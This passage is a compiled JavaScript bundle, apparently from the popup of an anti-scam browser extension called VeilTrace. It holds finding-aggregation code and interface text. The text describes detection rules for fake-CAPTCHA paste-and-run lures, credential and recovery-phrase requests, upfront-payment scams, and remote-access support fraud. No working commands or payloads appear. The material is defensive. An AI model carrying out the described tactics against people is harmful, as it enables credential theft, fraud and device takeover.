"use strict";
(() => {
  // src/extension/popup/aggregate.ts
  var CATEGORIES = ["command", "credential", "payment", "support"], TIER = { none: 0, observed_instruction: 1, suspicious_correlation: 2, manipulative_instruction: 3 }, RISK = { high: 1, medium: 0 }, CONF = { high: 2, medium: 1, low: 0 };
  function compareRefs(a, b) {
    return TIER[b.classification] - TIER[a.classification] || RISK[b.actionRisk] - RISK[a.actionRisk] || CONF[b.confidence] - CONF[a.confidence] || CATEGORIES.indexOf(a.category) - CATEGORIES.indexOf(b.category) || a.index - b.index;
  }
  function refsOf(r) {
    let locs = (ev) => [...new Set(ev.flatMap((e) => e.locator ? [e.locator] : []))], make = (category, f, index) => ({ key: `${category}:${f.id}`, category, id: f.id, ruleId: f.ruleId, classification: f.classification, confidence: f.confidence, actionRisk: f.actionRisk, locators: locs(f.evidence), index });
    return [
      ...r.findings.map((f, i) => make("command", f, i)),
      ...r.credential.findings.map((f, i) => make("credential", f, i)),
      ...r.payment.findings.map((f, i) => make("payment", f, i)),
      ...r.support.findings.map((f, i) => make("support", f, i))
    ];
  }
  function groupRefs(refs) {
    let parent = refs.map((_, i) => i), find = (i) => parent[i] === i ? i : parent[i] = find(parent[i]), owner = /* @__PURE__ */ new Map();
    refs.forEach((ref, i) => {
      for (let loc of ref.locators) {
        let j = owner.get(loc);
        j === void 0 ? owner.set(loc, i) : parent[find(i)] = find(j);
      }
    });
    let byRoot = /* @__PURE__ */ new Map();
    return refs.forEach((ref, i) => byRoot.set(find(i), [...byRoot.get(find(i)) ?? [], ref])), [...byRoot.values()].map((members) => {
      members.sort(compareRefs);
      let top = members[0], shared = /* @__PURE__ */ new Map();
      if (members.length > 1)
        for (let loc of new Set(members.flatMap((m) => m.locators))) {
          let cats = [...new Set(members.filter((m) => m.locators.includes(loc)).map((m) => m.category))];
          members.filter((m) => m.locators.includes(loc)).length > 1 && shared.set(loc, cats);
        }
      return { key: members.map((m) => m.key).join("+"), members, classification: top.classification, actionRisk: top.actionRisk, shared };
    }).sort((a, b) => compareRefs(a.members[0], b.members[0]));
  }
  function aggregate(r) {
    let refs = refsOf(r), verdictOf = { command: r.verdict, credential: r.credential.verdict, payment: r.payment.verdict, support: r.support.verdict }, categories = Object.fromEntries(CATEGORIES.map((c) => {
      let mine = refs.filter((x) => x.category === c);
      return [c, { verdict: verdictOf[c], total: mine.length, actionable: mine.filter((x) => x.classification !== "observed_instruction").length }];
    })), highest = CATEGORIES.map((c) => verdictOf[c]).reduce((a, b) => TIER[b] > TIER[a] ? b : a, "none"), groups = groupRefs(refs);
    return {
      highest,
      actionable: refs.filter((x) => x.classification !== "observed_instruction").length,
      affected: CATEGORIES.filter((c) => categories[c].actionable > 0),
      categories,
      groups: groups.filter((g) => g.classification !== "observed_instruction"),
      observed: groups.filter((g) => g.classification === "observed_instruction"),
      complete: r.status.complete
    };
  }

  // src/extension/popup/i18n.ts
  var EN = {
    locale: "en-US",
    tagline: "Uncover the manipulation behind the page",
    pageLabel: "Page",
    noPage: "No page",
    protectedPage: "Protected page",
    scan: "Scan page",
    scanAgain: "Scan again",
    scanning: "Scanning this page on your device\u2026",
    scanFinished: "Scan finished.",
    languageLabel: "Language",
    limitsSummary: "What VeilTrace can and cannot see",
    limitsText: 'VeilTrace analyzes visible page text and some hidden clipboard text, on this device only. On request ("Read text in images"), it also reads text inside images on the visible part of the page, also on this device. It does not examine videos, audio, scripts, images outside the visible area or content from other sites inside frames, and it can miss instructions worded in unusual ways or text the reader cannot make out. A result without findings is not a guarantee.',
    metaIdle: "Runs on this device only. Nothing is sent anywhere.",
    meta: (engine, extractor, ms) => `Engine ${engine} \xB7 extractor ${extractor} \xB7 ${ms} ms \xB7 on this device only`,
    partialQualifier: " Part of the page could not be examined (see below).",
    classification: { manipulative_instruction: "Manipulative", suspicious_correlation: "Suspicious", observed_instruction: "Observed" },
    findingTitle: { manipulative_instruction: "Manipulative instruction", suspicious_correlation: "Suspicious instruction", observed_instruction: "Observed instruction" },
    confidence: { high: "Confidence: high", medium: "Confidence: medium", low: "Confidence: low" },
    confidenceHelp: "How strongly the evidence supports this classification.",
    actionRisk: {
      high: "Action risk: high. Following it would run code on your computer.",
      medium: "Action risk: medium. Part of a sequence that runs code."
    },
    ruleChip: (id) => `Rule ${id}`,
    rule: {
      R1: "Asks you to open Run or a terminal, paste and execute, presented as a human-verification (CAPTCHA) step.",
      R2: "Puts a command on your screen or clipboard and presents running it as a human-verification step.",
      R3: "Contains part of an open, paste and execute sequence, presented as a human-verification step.",
      R4: 'Asks you to run code and uses urgency, claimed authority or a "fix this error" story nearby.',
      R5: "Contains an instruction to run code, with no manipulation signs in the same part of the page."
    },
    signal: {
      "A.OPEN_RUN": "Open Run / terminal",
      "A.PASTE": "Paste step",
      "A.EXECUTE": "Execute step",
      "A.COMMAND": "Shell command",
      "A.COPY_TRIGGER": "Copy / verify control",
      "P.HUMAN_VERIFY": "Fake human verification",
      "P.FAKE_FIX": 'Error or "fix" pretext',
      "P.URGENCY": "Urgency or threat",
      "P.AUTHORITY": "Claimed authority",
      "C.NEGATION": "Negation",
      "C.REPORTED": "Reported speech",
      "C.EDUCATIONAL": "Educational context"
    },
    source: { "visible-text": "Visible text", "hidden-clipboard": "Hidden clipboard text", "copy-control": "Copy button" },
    deobfuscated: "disguised characters normalized",
    showOnPage: "Show on page",
    evidenceAria: "Evidence",
    highlight: {
      highlighted: "Highlighted on the page.",
      "invalid-locator": "This evidence cannot be located on the page.",
      "not-found": "This element is no longer on the page. The page may have changed since the scan; scan again.",
      "frame-inaccessible": "This evidence is inside an embedded frame that VeilTrace cannot highlight.",
      "not-visible": "This evidence is not visible on the page (for example, hidden clipboard text).",
      failed: "Could not highlight: the page is no longer accessible. Scan again."
    },
    completeTitle: "Complete scan",
    completeText: (n) => `${n} text blocks analyzed. Complete within what VeilTrace can see.`,
    partialTitle: "Partial scan: some content was not examined",
    partialFooter: (n) => `Findings cover only the ${n} text blocks that were analyzed.`,
    partial: {
      "node-budget": "The page is very large. Analysis stopped at the element limit.",
      "block-budget": "The page is very large. Only the first 5,000 text blocks were analyzed.",
      "char-budget": "The page contains a lot of text. Analysis stopped at the text limit.",
      timeout: "Analysis reached its time limit. The rest of the page was not examined.",
      "block-text-capped": "Some very long text blocks were only partly analyzed.",
      "aux-capped": "The page has many copy buttons or hidden clipboard texts. Some were skipped.",
      "frames-skipped": "Embedded frames from other sites could not be examined.",
      "closed-shadow-skipped": "Some embedded page components could not be examined.",
      "extractor-truncated": "Some content was skipped.",
      "core-truncated": "Some content exceeded the analysis limits and was skipped."
    },
    loweredFrom: (cls) => `Lowered from ${cls.toLowerCase()} because of context: `,
    contextPrefix: "Context: ",
    modifier: {
      "C.QUOTED": "the instruction is inside a quotation.",
      "C.REPORTED": "the text reports what someone else was told to do.",
      "C.EDUCATIONAL": "the surrounding text is educational or awareness material.",
      "C.CODE_EXAMPLE": "the instruction is a code example inside an article.",
      "C.PROCEDURAL": "the instruction is a step in a procedural document."
    },
    override: {
      "O.CONCEALED_PAYLOAD": "Not lowered: this part of the page also places hidden text on your clipboard, which a quotation or tutorial would not do.",
      "O.VERIFICATION_GATE": "Not lowered: the instruction sits in a short verification dialog addressed to you."
    },
    overrideCapped: "Lowered by at most one level: the instruction sits in a short verification dialog addressed to you.",
    contextSetAside: "Context set aside",
    overrideEvidence: "Supporting evidence",
    moreEvidence: (n) => `${n} more evidence item(s) not shown.`,
    moreFindings: (n) => `${n} more finding(s) not shown (display limit).`,
    severity: { manipulative_instruction: "Severity: high", suspicious_correlation: "Severity: medium", observed_instruction: "Severity: informational" },
    cred: {
      experimental: "Experimental",
      findingTitle: { manipulative_instruction: "Manipulative request for a secret", suspicious_correlation: "Suspicious request for a secret", observed_instruction: "Sign-in or code request" },
      ruleChip: (id) => `Rule ${id}`,
      rule: {
        CR1: "Asks you to send a secret to a person or channel. Real services ask you to type codes into their own form, never to pass them on.",
        CR2: "Asks for a wallet recovery phrase and wraps the request in a pretext. Anyone with the phrase controls the wallet.",
        CR3: "Asks for a secret inside content the site may not control (comments, widgets, embedded frames), together with a pretext.",
        CR4: "Asks for a secret together with a threat to suspend, lock or close your account.",
        CR5: "Asks for a password or code with no manipulation signs nearby."
      },
      asks: (action, secrets) => action === "send" ? `Asks you to send: ${secrets}` : `Asks you to enter: ${secrets}`,
      secret: { password: "password", otp: "one-time code", pin: "PIN", "recovery-code": "recovery code", "recovery-phrase": "recovery phrase", token: "access token" },
      indicators: "Indicators",
      pretext: {
        "CP.ACCOUNT_THREAT": "threat to the account",
        "CP.URGENCY": "deadline or urgency",
        "CP.SUPPORT": "claims to be support or an official",
        "CP.VERIFY": "verification framing",
        "CP.REWARD": "prize or reward"
      },
      trust: {
        "user-content": "in user-posted content",
        "third-party-widget": "in an embedded widget",
        "embedded-frame": "in an embedded frame",
        dialog: "in a dialog",
        overlay: "in an overlay",
        form: "in a form"
      },
      destination: {
        none: "The form submits to this page.",
        "same-origin": "The form submits to this site.",
        "other-origin": "The form submits to another site.",
        mailto: "The form opens an email message.",
        javascript: "The form is handled by a script on the page.",
        data: "The form submits to an inline data address.",
        other: "The form submits to an unusual address."
      },
      actionRisk: {
        high: "Action risk: high. Whoever gets this can take over the account or wallet.",
        medium: "Action risk: medium. Entering it on the wrong site can expose your account."
      },
      modifier: {
        "C.QUOTED": "the request is inside a quotation.",
        "C.REPORTED": "the text reports what someone else was asked to do.",
        "C.EDUCATIONAL": "the surrounding text is educational or awareness material.",
        "C.CODE_EXAMPLE": "the request is inside a code sample."
      },
      overrideLiveField: "Not lowered: the same part of the page has a working input field for the secret.",
      signal: {
        "S.PASSWORD": "Password",
        "S.OTP": "One-time code",
        "S.PIN": "PIN",
        "S.RECOVERY_CODE": "Recovery code",
        "S.SEED_PHRASE": "Recovery phrase",
        "S.TOKEN": "Access token",
        "D.SEND": "Send or share",
        "D.ENTER": "Enter",
        "CP.ACCOUNT_THREAT": "Account threat",
        "CP.URGENCY": "Urgency",
        "CP.SUPPORT": "Claimed support or authority",
        "CP.VERIFY": "Verification framing",
        "CP.REWARD": "Reward",
        "F.SECRET_FIELD": "Input field",
        "C.NEGATION": "Negation",
        "C.REPORTED": "Reported speech",
        "C.EDUCATIONAL": "Educational context"
      },
      fieldSource: "Form field",
      fieldKind: {
        password: "password",
        otp: "one-time code",
        pin: "PIN",
        "recovery-code": "recovery code",
        "secret-phrase": "recovery phrase",
        email: "email",
        text: "text",
        other: "other"
      },
      unlabeledField: "(field without a label)",
      limitation: {
        "claimed-identity-unverifiable": "VeilTrace cannot verify who wrote this. A claim to be support or an official is not proof.",
        "destination-not-scored": "Where the form submits is shown for information only; VeilTrace does not judge sites.",
        "trust-boundary-heuristic": "Whether this content comes from the site or from others is estimated from the page structure."
      }
    },
    pay: {
      findingTitle: { manipulative_instruction: "Manipulative payment request", suspicious_correlation: "Suspicious payment request", observed_instruction: "Payment request" },
      ruleChip: (id) => `Rule ${id}`,
      rule: {
        PR1: "Asks you to pay first in order to receive something (a refund, a prize, released funds or an unlocked account). Real refunds and prizes never require an upfront payment.",
        PR2: "Asks you to pay outside an ordinary checkout (a personal account, off the platform, gift cards or cryptocurrency), together with pressure. Such payments are hard to get back.",
        PR3: "Asks for a payment together with a threat (account closure, arrest or legal action) and urgency or a claimed authority.",
        PR4: "Asks for a payment with no manipulation signs nearby."
      },
      promise: { refund: "a refund", prize: "a prize", "account-unlock": "an unlocked account", release: "released money or goods", recruitment: "a guaranteed place in a selection", job: "a job", "investment-return": "a fixed or guaranteed investment return", loan: 'a loan that is "approved" or "sure to be paid out"' },
      destination: { "personal-account": "a personal account", "off-platform": "outside the platform", "gift-card": "gift cards", crypto: "cryptocurrency" },
      pressure: { threat: "threat", urgency: "deadline or urgency", "claimed-authority": "claims to be support or an authority", "claimed-family": "claims to be a family member on a new number" },
      promisesLabel: "Promised in return",
      destinationsLabel: "Payment goes to",
      indicators: "Indicators",
      actionRisk: {
        high: "Action risk: high. Money sent this way is usually lost.",
        medium: "Action risk: medium. Paying the wrong party can cost you money."
      },
      signal: {
        "PY.PAY": "Payment request",
        "PA.AMOUNT": "Amount",
        "PF.FEE": "Fee",
        "PF.RELEASE_FEE": "Fee to release or unlock",
        "PD.PERSONAL": "Personal account",
        "PD.OFF_PLATFORM": "Outside the platform",
        "PD.GIFT_CARD": "Gift cards",
        "PD.CRYPTO": "Cryptocurrency",
        "PR.REFUND": "Refund or held money",
        "PR.PRIZE": "Prize",
        "PR.UNLOCK": "Account unlock",
        "PR.RECRUIT": "Guaranteed selection",
        "PR.JOB": "Job offer",
        "PC.CONDITION": "Payment as a condition",
        "PP.THREAT": "Threat",
        "PP.FAMILY": "Claimed family member",
        "PP.URGENCY": "Urgency",
        "PP.AUTHORITY": "Claimed support or authority",
        "C.NEGATION": "Negation",
        "C.REPORTED": "Reported speech",
        "C.EDUCATIONAL": "Educational context"
      },
      amountHidden: "(amount on the page; the value is not shown)",
      limitation: {
        "claimed-identity-unverifiable": "VeilTrace cannot verify who wrote this. A claim to be support, a bank or the police is not proof.",
        "trust-boundary-heuristic": "Whether this content comes from the site or from others is estimated from the page structure.",
        "amount-not-reported": "Amounts are matched to understand the request, but their values are never copied into the report."
      }
    },
    sup: {
      findingTitle: { manipulative_instruction: "Manipulative support direction", suspicious_correlation: "Suspicious support direction", observed_instruction: "Support direction" },
      ruleChip: (id) => `Rule ${id}`,
      rule: {
        SR1: "The web page claims your device is infected or locked and tells you to call, install or allow access. Browsers and operating systems do not show such alarms inside web pages.",
        SR2: "Someone presenting as support, a bank or an administrator asks you to install software or allow remote access, under pressure or from content the site may not control.",
        SR3: "Someone presenting as support, a bank or an administrator sends you to an outside contact together with a threat to your account or data.",
        SR4: "A comment or other user-posted content presents itself as official support and sends you to an outside contact.",
        SR5: "Directs you to contact support, install software or allow remote access, with no impersonation or pressure signs nearby.",
        SR6: "A message presented as a notice from a bank, e-wallet, marketplace or its support raises an alarm, a threat or a reward and asks you to reply, choose an option, open a link or fill in a form. Banks and platforms do not settle such matters through a reply or a link in a message.",
        SR7: "Congratulates you on a cash prize you did not enter for and asks you to answer a quiz, often in a company's name. Such quizzes lead people to share the link or hand over data or money.",
        SR8: "Offers to get into someone else's messages, account or phone and sends you to a contact. Such services are illegal, and buyers are commonly cheated or blackmailed.",
        SR9: "Someone presenting as a buyer, tenant or landlord sends you to a relative or another person on a personal number to settle a price or payment. Fake-buyer and payment-redirect scams start this way.",
        SR10: "A message offers an Android app file (.apk) presented as an invitation, a parcel photo, a receipt, a ticket or a bill, or asks you to install it or to turn off your phone's protection. Opening such a file installs an app that can read your text messages and take over banking apps."
      },
      action: { contact: "contact someone", respond: "reply, choose an option, open a link or fill in a form", survey: "answer a quiz or questionnaire", "remote-access": "allow remote access", install: "install software", "disable-protection": "turn off your device's protection or allow unknown apps" },
      channel: { phone: "phone number", mobile: "mobile number", messenger: "messaging app", link: "link", "apk-file": "app file (.apk)" },
      claim: { support: "support or customer service", bank: "a bank", administrator: "an administrator", "security-team": "a security team", official: "an official, officer or investigator", organization: "a company or institution" },
      indicator: {
        "page-rendered-system-alert": "virus or lock alarm shown by the web page",
        "remote-access-request": "asks for remote access",
        "software-install-request": "asks you to install software",
        "personal-channel-contact": "official-sounding claim with a mobile number or messaging app",
        "claim-in-user-content": "official claim inside user-posted content",
        "alert-in-overlay": "alarm in an overlay covering the page",
        "protection-disable-request": "asks you to turn off protection, allow unknown apps or grant accessibility",
        "apk-file-in-message": "app file (.apk) sent in a message"
      },
      pressure: { "system-alert": "device alarm", "account-alarm": "account alarm (sign-in, transaction or tariff)", threat: "threat to the account or data", urgency: "deadline or urgency", reward: "reward or points", "pre-won": "congratulations on a prize you did not enter for", "illicit-access": "offer to get into someone else's account or phone", "third-party-redirect": "sends you to a relative or proxy on a personal number", "document-pretext": "presented as an invitation, parcel photo, receipt, ticket or bill" },
      asksLabel: "Asks you to",
      claimsLabel: "Claims to be (not verified)",
      indicatorsLabel: "Observed indicators",
      pressureLabel: "Pressure",
      actionRisk: {
        high: "Action risk: high. Installing software or allowing remote access can give a stranger control of your device.",
        medium: "Action risk: medium. Contacting a fake support line can lead to requests for money, codes or access."
      },
      signal: {
        "SC.CONTACT": "Contact direction",
        "SC.RESPOND": "Reply, link or form request",
        "SC.SURVEY": "Quiz or questionnaire",
        "SA.REMOTE": "Remote access request",
        "SA.INSTALL": "Install request",
        "SX.PHONE": "Phone number",
        "SX.MOBILE": "Mobile number",
        "SX.MESSENGER": "Messaging app",
        "SX.LINK": "Link",
        "SI.SUPPORT": "Claimed support",
        "SI.BANK": "Claimed bank",
        "SI.ADMIN": "Claimed administrator",
        "SI.SECURITY": "Claimed security team",
        "SI.OFFICIAL": "Claimed official or rank",
        "SW.ALERT": "Device alarm",
        "ST.THREAT": "Threat",
        "SU.URGENCY": "Urgency",
        "SW.ACCOUNT": "Account alarm",
        "SP.REWARD": "Reward",
        "SP.WON": "Unentered prize",
        "SO.ILLICIT": "Illegal access offer",
        "SO.PROXY": "Redirect to a relative or proxy",
        "SI.ORG": "Claimed company or institution",
        "SH.UNASSERTED": "Condition or attribution",
        "C.NEGATION": "Negation",
        "C.REPORTED": "Reported speech",
        "C.EDUCATIONAL": "Educational context"
      },
      contactHidden: "(contact number on the page; not shown)",
      limitation: {
        "claimed-identity-unverifiable": "VeilTrace cannot verify who wrote this. A claim to be support, a bank or an administrator is not proof, and VeilTrace does not say the organization itself is fake.",
        "trust-boundary-heuristic": "Whether this content comes from the site or from others is estimated from the page structure.",
        "contact-details-not-reported": "Phone numbers are matched to understand the direction, but are never copied into the report."
      }
    },
    pwa: {
      title: "Check a message",
      intro: "Paste a suspicious message, or check a screenshot of it, to see whether it tries to manipulate you. Screenshots are read on this device.",
      sourceLabel: "Where is it from?",
      source: { chat: "Chat (WhatsApp, Telegram\u2026)", sms: "SMS", email: "Email", web: "Text from a website" },
      placeholder: "Paste the message here\u2026",
      check: "Check message",
      clear: "Clear",
      paste: "Paste from clipboard",
      shareHint: "On Android, install this app, then share a message or a screenshot to VeilTrace.",
      privacy: "Checked on this device only. The message is not sent, saved or shared.",
      empty: "Paste or share a message first.",
      tooLong: "Only the first 20,000 characters were checked.",
      assessment: "MESSAGE THREAT ASSESSMENT",
      headlineDetail: {
        manipulative_instruction: "This message tries to make you do something harmful. Do not follow the instructions listed below.",
        suspicious_correlation: "This message combines requests with signs often seen in scams. Check the findings below before you act.",
        observed_instruction: "Ordinary instructions or requests were found and are listed as observed. This is not a guarantee about the message.",
        none: "VeilTrace found nothing to report in this text. This is not a guarantee about the message or its sender."
      },
      linkOnly: "Only a link was pasted. VeilTrace checks what a message says and does not judge web addresses. Paste the whole message, including the text around the link. Do not open the link just to check it.",
      yourMessage: "Your message",
      offlineReady: "Ready to work offline.",
      image: "Check a screenshot",
      ocrProgress: (p) => `Reading the text in the image on this device\u2026 ${p}%`,
      ocrDone: "Text read from the image. Compare it with the image and correct it if needed, then check again.",
      ocrEmpty: "No text could be read from this image. Try a sharper screenshot, or paste the text.",
      ocrFailed: "The image could not be read on this device. Paste the text instead."
    },
    imageText: {
      title: "Text in images \xB7 on this device",
      intro: "Some lures are drawn inside images (posters, banners, photographed letters). VeilTrace can read the visible part of this page from a screenshot, on this device, and check the text that is not already page text. Nothing is sent.",
      run: "Read text in images",
      reading: (p) => `Reading the visible screen on this device\u2026 ${p}%`,
      analyzing: "Checking the text found in images\u2026",
      done: (n) => `${n} line${n === 1 ? "" : "s"} of text found only in images on the visible screen.`,
      nothing: "No text was found in images on the visible screen beyond what the page already shows as text. Scroll and read again to check other parts.",
      noText: "No text could be read from the visible screen.",
      failed: "The screen could not be read here. Some pages and browsers do not allow a screenshot.",
      notShowable: "Inside an image: it cannot be highlighted on the page."
    },
    ai: {
      title: "AI second opinion \xB7 optional, on this device",
      intro: "The AI model built into Chrome can read this page's text and give a second opinion. It runs on this device and nothing is sent. The VeilTrace result above does not change.",
      prepare: "Show the text the AI will read",
      previewSummary: (n, cut) => `${n} lines of page text; numbers, links and email addresses are masked${cut ? "; cut to fit" : ""}`,
      run: "Ask the on-device AI",
      running: "The AI is reading the text\u2026",
      downloading: (p) => `Chrome is downloading its AI model\u2026 ${p}%`,
      unsupported: "Not available in this browser. The on-device AI needs Chrome on Windows, macOS, Linux or a Chromebook Plus with its built-in model.",
      unavailable: "Chrome's built-in AI model is not available on this device (hardware, free storage or settings).",
      failed: "The AI did not give a usable answer. Try again.",
      noText: "There is no page text to read.",
      resultTitle: "AI opinion \xB7 may be wrong",
      assessment: { manipulative: "The AI sees signs of manipulation.", suspicious: "The AI sees some suspicious signs.", "no-clear-signs": "The AI sees no clear signs of manipulation. This is not a guarantee." },
      tactic: {
        impersonation: "claims to be a bank, company, support or official",
        "threat-or-urgency": "threat, alarm or deadline",
        "too-good-to-be-true": "prize, refund or job that is too good to be true",
        "payment-request": "asks for a payment",
        "credential-request": "asks for a password, code or PIN",
        "link-or-reply-lure": "link, reply, quiz or form as a lure",
        "run-command": "asks you to run a command",
        "remote-access-or-install": "asks you to install an app or allow remote access",
        "illegal-service": "offers an illegal service",
        "personal-contact-channel": "personal phone number or messenger"
      },
      confidence: { low: "AI confidence: low", medium: "AI confidence: medium", high: "AI confidence: high" },
      tacticsLabel: "Tactics the AI names",
      citedLines: "Lines the AI points to",
      disagreeAlert: "The AI and VeilTrace disagree. VeilTrace found no documented manipulation pattern on this page. Read the lines the AI points to yourself: the AI may be wrong.",
      disagreeQuiet: "The AI and VeilTrace disagree. The AI does not see what VeilTrace found; VeilTrace's findings above show the evidence they are based on.",
      caveat: "An opinion from a language model: it can be wrong or misled by the page itself, and Indonesian is not one of its supported languages. It does not change the VeilTrace result."
    },
    auto: {
      actionTitle: "VeilTrace: scan this page",
      badgeTitle: "VeilTrace: manipulative content found on this page. Click for details.",
      title: "Scan mode",
      modeLabel: { manual: "MANUAL", automatic: "AUTO" },
      manualText: "Manual: VeilTrace reads a page only when you click Scan page.",
      automaticText: 'Automatic: VeilTrace checks pages as they load and change, and marks the toolbar icon with "!" when it finds manipulative content.',
      consent: "Your browser will ask you to let VeilTrace read all websites. Pages are still analyzed only on this device: nothing is sent, stored or shared, and form values are never read. It applies to pages opened or reloaded afterwards, and you can turn it off here or in Chrome settings at any time.",
      managedText: "Automatic scanning is turned on by your organization. Pages are still analyzed only on this device; nothing is reported to your organization or anyone else.",
      enable: "Turn on automatic scanning",
      disable: "Turn off automatic scanning",
      denied: "Permission not granted. VeilTrace stays in manual mode.",
      failed: "The scan mode could not be changed. Try again."
    },
    dash: {
      stateLabel: { standby: "STANDBY", scanning: "SCANNING", complete: "SCAN COMPLETE", partial: "PARTIAL SCAN", error: "SCAN FAILED" },
      assessment: "PAGE THREAT ASSESSMENT",
      headline: {
        manipulative_instruction: {
          tone: "danger",
          title: "Manipulative content detected",
          detail: "This page tries to make you do something harmful. Do not follow the instructions listed below."
        },
        suspicious_correlation: {
          tone: "warning",
          title: "Suspicious content detected",
          detail: "This page combines requests with signs often seen in scams. Check the findings below before you act."
        },
        observed_instruction: {
          tone: "neutral",
          title: "No manipulation signs in the analyzed content",
          detail: "Ordinary instructions or requests were found and are listed as observed. This is not a guarantee about the page."
        },
        none: {
          tone: "neutral",
          title: "Nothing to report in the analyzed content",
          detail: "VeilTrace found no findings in what it could examine. This is not a guarantee about the page."
        }
      },
      statHighest: "Highest classification",
      statActionable: "Actionable findings",
      statCategories: "Affected categories",
      statCoverage: "Scan coverage",
      coverageValue: { complete: "Complete", partial: "Partial" },
      noCategories: "None",
      verdictLabel: { manipulative_instruction: "Manipulative", suspicious_correlation: "Suspicious", observed_instruction: "Observed only", none: "No findings" },
      overviewTitle: "Detection categories",
      categoryName: {
        command: "Command Execution Manipulation",
        credential: "Credential Disclosure Manipulation",
        payment: "Payment Manipulation",
        support: "Support & Authority Impersonation"
      },
      categoryCode: { command: "CMD", credential: "CRED", payment: "PAY", support: "SUP" },
      tileCount: (total, actionable) => total === 0 ? "0 findings" : `${actionable} actionable \xB7 ${total} total`,
      experimental: "Experimental",
      experimentalNote: "Credential, payment and support checks are experimental and have not yet passed an independent evaluation. They read only the page text and form structure, never what you typed, and never copy amounts or phone numbers.",
      findingsTitle: (n) => `Findings (${n})`,
      observedTitle: (n) => `Observed without manipulation signs (${n})`,
      groupTitle: (n) => `${n} related findings on the same page element`,
      groupNote: "Each detector\u2019s finding is shown with its own evidence.",
      alsoCitedBy: (c) => `Also cited by: ${c}`,
      evidenceTitle: "Observed evidence",
      evidenceId: (id) => `Evidence ID ${id}`,
      findingId: (id) => `Finding ID ${id}`,
      actionRiskChip: { high: "Action risk: high", medium: "Action risk: medium" },
      adviceTitle: "What to do",
      advice: {
        command: "Do not press Win+R, open a terminal, paste or run anything this page asks for. A real CAPTCHA never asks you to run commands.",
        credential: "Do not send passwords, one-time codes or recovery phrases to anyone. Sign in only on a site you opened yourself.",
        payment: "Do not pay to receive a refund, prize or unlocked account, and do not pay personal accounts, gift cards or crypto on request. Contact the organization through a channel you already know.",
        support: "Do not call numbers or message accounts shown in alerts or comments. Look up the organization\u2019s contact details yourself.",
        remoteAccess: "Never install remote-access apps (AnyDesk, TeamViewer) or other software because someone claiming to be support asks you to."
      },
      adviceNone: "No findings does not make a page trustworthy. VeilTrace checks only what it can see on this page, at the moment of the scan."
    },
    errors: {
      noPageTitle: "No page to scan",
      noPageDetail: "Open a web page, then click the VeilTrace button again.",
      restrictedTitle: "This page cannot be scanned",
      restrictedDetail: "Browser-protected pages (such as the browser's internal pages, extension stores and other extensions) do not allow extensions to read them.",
      accessTitle: "VeilTrace could not access this page",
      accessDetail: "The page may block extensions or may have changed. Reload the page and try again.",
      fileDetail: `To scan local files, turn on "Allow access to file URLs" for VeilTrace on your browser's extensions page.`,
      badReportTitle: "Scan failed",
      badReportDetail: "The scan returned unexpected data and was discarded."
    }
  }, ID = {
    locale: "id-ID",
    tagline: "Ungkap manipulasi di balik halaman",
    pageLabel: "Halaman",
    noPage: "Tidak ada halaman",
    protectedPage: "Halaman terlindungi",
    scan: "Pindai halaman",
    scanAgain: "Pindai ulang",
    scanning: "Memindai halaman ini di perangkat Anda\u2026",
    scanFinished: "Pemindaian selesai.",
    languageLabel: "Bahasa",
    limitsSummary: "Apa yang bisa dan tidak bisa dilihat VeilTrace",
    limitsText: 'VeilTrace menganalisis teks yang terlihat di halaman dan sebagian teks clipboard tersembunyi, hanya di perangkat ini. Atas permintaan ("Baca teks di gambar"), VeilTrace juga membaca teks di dalam gambar pada bagian halaman yang terlihat, juga di perangkat ini. VeilTrace tidak memeriksa video, audio, skrip, gambar di luar layar yang terlihat, atau konten dari situs lain di dalam frame, dan bisa melewatkan instruksi yang ditulis dengan cara tidak biasa atau teks yang tidak terbaca. Hasil tanpa temuan bukan jaminan.',
    metaIdle: "Berjalan hanya di perangkat ini. Tidak ada data yang dikirim.",
    meta: (engine, extractor, ms) => `Engine ${engine} \xB7 extractor ${extractor} \xB7 ${ms} md \xB7 hanya di perangkat ini`,
    partialQualifier: " Sebagian halaman tidak dapat diperiksa (lihat di bawah).",
    classification: { manipulative_instruction: "Manipulatif", suspicious_correlation: "Mencurigakan", observed_instruction: "Teramati" },
    findingTitle: { manipulative_instruction: "Instruksi manipulatif", suspicious_correlation: "Instruksi mencurigakan", observed_instruction: "Instruksi teramati" },
    confidence: { high: "Keyakinan: tinggi", medium: "Keyakinan: sedang", low: "Keyakinan: rendah" },
    confidenceHelp: "Seberapa kuat bukti mendukung klasifikasi ini.",
    actionRisk: {
      high: "Risiko tindakan: tinggi. Mengikutinya akan menjalankan kode di komputer Anda.",
      medium: "Risiko tindakan: sedang. Bagian dari rangkaian langkah yang menjalankan kode."
    },
    ruleChip: (id) => `Aturan ${id}`,
    rule: {
      R1: "Meminta Anda membuka Run atau terminal, menempelkan, lalu menjalankan, dengan dalih verifikasi manusia (CAPTCHA).",
      R2: "Menaruh perintah di layar atau clipboard Anda dan menyajikan cara menjalankannya sebagai verifikasi manusia.",
      R3: "Memuat sebagian rangkaian buka, tempel, dan jalankan, dengan dalih verifikasi manusia.",
      R4: 'Meminta Anda menjalankan kode dan memakai desakan, klaim otoritas, atau cerita "perbaiki error ini" di dekatnya.',
      R5: "Memuat instruksi untuk menjalankan kode, tanpa tanda manipulasi di bagian halaman yang sama."
    },
    signal: {
      "A.OPEN_RUN": "Buka Run / terminal",
      "A.PASTE": "Langkah tempel",
      "A.EXECUTE": "Langkah jalankan",
      "A.COMMAND": "Perintah shell",
      "A.COPY_TRIGGER": "Tombol salin / verifikasi",
      "P.HUMAN_VERIFY": "Verifikasi manusia palsu",
      "P.FAKE_FIX": 'Dalih error atau "perbaikan"',
      "P.URGENCY": "Desakan atau ancaman",
      "P.AUTHORITY": "Klaim otoritas",
      "C.NEGATION": "Negasi",
      "C.REPORTED": "Kalimat laporan",
      "C.EDUCATIONAL": "Konteks edukasi"
    },
    source: { "visible-text": "Teks terlihat", "hidden-clipboard": "Teks clipboard tersembunyi", "copy-control": "Tombol salin" },
    deobfuscated: "karakter samaran dinormalkan",
    showOnPage: "Tunjukkan di halaman",
    evidenceAria: "Bukti",
    highlight: {
      highlighted: "Ditandai di halaman.",
      "invalid-locator": "Bukti ini tidak dapat ditemukan di halaman.",
      "not-found": "Elemen ini sudah tidak ada di halaman. Halaman mungkin berubah sejak pemindaian; pindai ulang.",
      "frame-inaccessible": "Bukti ini berada di dalam frame tersemat yang tidak dapat ditandai VeilTrace.",
      "not-visible": "Bukti ini tidak terlihat di halaman (misalnya teks clipboard tersembunyi).",
      failed: "Tidak dapat menandai: halaman sudah tidak dapat diakses. Pindai ulang."
    },
    completeTitle: "Pemindaian lengkap",
